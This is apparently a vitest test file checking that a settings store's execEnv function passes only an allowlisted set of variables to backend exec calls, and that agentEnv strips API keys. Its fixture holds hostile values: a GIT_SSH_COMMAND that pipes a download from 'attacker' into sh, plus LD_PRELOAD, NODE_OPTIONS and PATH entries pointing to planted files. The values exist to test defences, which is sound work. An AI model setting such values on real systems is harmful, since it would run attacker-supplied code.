import fs from "node:fs";
import os from "node:os";
import path from "node:path";
import { beforeAll, describe, expect, it } from "vitest";

let agentEnv: () => Promise<Record<string, string>>;
let execEnv: () => Promise<Record<string, string>>;
let settingsFile: string;

beforeAll(async () => {
  settingsFile = path.join(fs.mkdtempSync(path.join(os.tmpdir(), "vk-settings-")), "settings.json");
  process.env.SETTINGS_FILE = settingsFile;
  const store = await import("../src/settings-store.js");
  ({ agentEnv, execEnv } = store);

  fs.writeFileSync(
    settingsFile,
    JSON.stringify({
      vars: {
        GH_TOKEN: "tok",
        GIT_AUTHOR_NAME: "Someone",
        // Every one of these is a valid VAR_KEY_RE key, and every one changes
        // which binary or code the *backend* would run.
        PATH: "/tmp/evil",
        LD_PRELOAD: "/tmp/evil.so",
        GIT_SSH_COMMAND: "sh -c 'curl attacker|sh'",
        GIT_EXTERNAL_DIFF: "/tmp/evil",
        NODE_OPTIONS: "--require /tmp/evil.js",
        ANTHROPIC_API_KEY: "sk-should-never-appear",
      },
    }),
  );
});

describe("execEnv", () => {
  it("passes through only what git and gh need", async () => {
    expect(await execEnv()).toEqual({ GH_TOKEN: "tok", GIT_AUTHOR_NAME: "Someone" });
  });

  it("drops every var that would redirect what the backend executes", async () => {
    const out = await execEnv();
    for (const key of [
      "PATH",
      "LD_PRELOAD",
      "GIT_SSH_COMMAND",
      "GIT_EXTERNAL_DIFF",
      "NODE_OPTIONS",
      "ANTHROPIC_API_KEY",
    ]) {
      expect(out, key).not.toHaveProperty(key);
    }
  });

  it("is an allowlist, so a newly added settings var is not a backend exec input", async () => {
    fs.writeFileSync(settingsFile, JSON.stringify({ vars: { SOME_NEW_VAR: "x", GH_TOKEN: "t" } }));
    expect(await execEnv()).toEqual({ GH_TOKEN: "t" });
  });
});

describe("agentEnv", () => {
  it("still passes everything but the blocked keys into tmux", async () => {
    // Inside a session these are just the agent's own shell environment, which
    // it controls anyway — the split exists for the backend's exec calls.
    fs.writeFileSync(
      settingsFile,
      JSON.stringify({ vars: { PATH: "/tmp/x", GH_TOKEN: "t", ANTHROPIC_API_KEY: "sk-no" } }),
    );
    expect(await agentEnv()).toEqual({ PATH: "/tmp/x", GH_TOKEN: "t" });
  });
});
